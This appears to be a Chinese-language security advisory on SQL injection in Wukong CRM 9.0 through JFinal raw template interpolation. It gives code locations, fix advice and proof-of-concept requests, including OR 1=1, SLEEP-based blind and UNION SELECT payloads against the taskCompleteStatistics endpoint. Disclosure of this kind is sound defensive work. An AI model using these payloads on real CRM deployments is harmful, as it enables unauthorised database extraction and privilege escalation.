# V-W001: 悟空CRM JFinal 原始插值SQL注入

## 漏洞信息

| 项目 | 详情 |
|------|------|
| 产品 | 悟空CRM 9.0 |
| 代码仓库 | https://github.com/72crm/72crm-java |
| 类型 | CWE-89: SQL注入 |
| 严重程度 | 高危 |
| 攻击向量 | 网络（已认证）|
| 框架 | JFinal |

## 漏洞描述

悟空CRM 9.0 存在多处SQL注入漏洞，原因是SQL模板文件使用JFinal原始插值语法`#(variable)`而非参数化`#para(variable)`。最直接可利用的是商务智能(BI)模块`taskCompleteStatistics` API中的`year`参数。

### 根本原因

JFinal SQL模板支持两种插值模式：
- `#para(variable)` — 生成参数化`?`占位符（安全）
- `#(variable)` — 原始字符串直接拼入SQL（不安全）

多处SQL模板文件对用户可控参数使用`#(variable)`。

## 漏洞详情

### 1. BI模块 — year参数SQL注入（主要）

**控制器**: `BiController.java`（第52行）
```java
@Permissions("bi:achievement:read")
@NotNullValidate(value = "year", message = "year不能为空")
public void taskCompleteStatistics(@Para("year") String year, @Para("type") Integer type,
                                    @Para("deptId") Integer deptId, @Para("userId") Integer userId) {
    renderJson(biService.taskCompleteStatistics(year, type, deptId, userId));
}
```

**服务**: `BiService.java`（第41-50行）
```java
public R taskCompleteStatistics(String year, Integer status, Integer deptId, Integer userId) {
    Kv kv = Kv.by("map", MonthEnum.values()).set("year", year);  // year直接传递
    // ...
    sqlPara = Db.getSqlPara("bi.base.taskCompleteStatistics", kv);
    recordList = Db.find(sqlPara);
}
```

**SQL模板**: `base.sql`（第88、118行）
```sql
-- 第88行：CONCAT字符串内的原始插值
DATE_FORMAT(order_date, '%Y%m') = CONCAT('#(year)', '#(x.value)')

-- 第118行：原始插值无引号（直接整数上下文）
and a.year = #(year)
```

**攻击**：`year`参数是用户可控的`String`，直接插值到SQL中无参数化或校验。

### 2. 客户模块 —— 字段重复检查（次要）

**SQL模板**: `customer.sql`（第210行）
```sql
#sql ("queryFieldDuplicate")
   select count(1) from `72crm_crm_customer` where #(key) = '#(value)'
#end
```

`#(key)`和`#(value)`都使用原始插值。`value`参数来自线索转客户过程中用户提交的客户字段数据（二阶SQL注入）。

**调用者**: `CrmLeadsService.java`（第257行）
```java
if (isUnique == 1 && Db.template("crm.customer.queryFieldDuplicate",
    Kv.by("key", key).set("value", customerMap.get(key))).queryInt() > 0) {
    return R.error(name + "已存在");
}
```

## 受影响文件

| 文件 | 行号 | 漏洞 |
|------|------|-------|
| `src/main/resources/template/bi/base.sql` | 88, 118 | `#(year)` 原始插值 |
| `src/main/resources/template/crm/customer.sql` | 210 | `#(key)`, `#(value)` 原始插值 |
| `src/main/java/com/kakarote/crm9/erp/bi/controller/BiController.java` | 52 | String `year`参数，无校验 |
| `src/main/java/com/kakarote/crm9/erp/bi/service/BiService.java` | 41-50 | 传递`year`到SQL模板 |
| `src/main/java/com/kakarote/crm9/erp/crm/service/CrmLeadsService.java` | 257 | 传递字段值到SQL模板 |

## 概念验证

### 步骤1：正常BI统计请求

```
POST /bi/taskCompleteStatistics
year=2026&type=3&userId=1&status=1
```

### 步骤2：通过year参数SQL注入

```
POST /bi/taskCompleteStatistics
year=2026 OR 1=1-- &type=3&userId=1&status=1
```

`year`参数在`base.sql:118`处插值为：
```sql
and a.year = 2026 OR 1=1--
```

这突破整数比较并返回所有记录。

### 步骤3：时间盲注

```
POST /bi/taskCompleteStatistics
year=2026 AND SLEEP(5)-- &type=3&userId=1&status=1
```

### 步骤4：UNION数据提取

```
POST /bi/taskCompleteStatistics
year=2026 UNION SELECT user(),version(),database(),4,5-- &type=3&userId=1&status=1
```

## 影响

1. **数据库数据提取**：有BI读取权限的已认证用户可提取任意数据库数据
2. **权限提升**：有BI访问的低权限用户可读取管理员凭据和其他敏感数据
3. **数据修改**：通过堆叠查询可能实现INSERT/UPDATE/DELETE（MySQL依赖）
4. **二阶攻击**：线索创建时存储的客户字段值在线索转换时可触发SQL注入

## 修复建议

1. **将`#(year)`替换为`#para(year)`**在`base.sql`第88、94、104、112、118行
2. **将`#(key)`和`#(value)`替换为`#para(key)`和`#para(value)`**在`customer.sql`第210行（注意：`#para()`不能用于列名，因此`key`应通过白名单校验）
3. **添加输入校验**：在控制器传递给服务前将`year`校验为4位整数
4. **审计所有`#()`用法**：搜索所有`.sql`模板文件中的`#(`模式并将用户输入参数替换为`#para(`

## 验证环境

- 源代码：悟空CRM 9.0（72crm-java）
- 分析：静态代码分析
- 日期：2026-04-13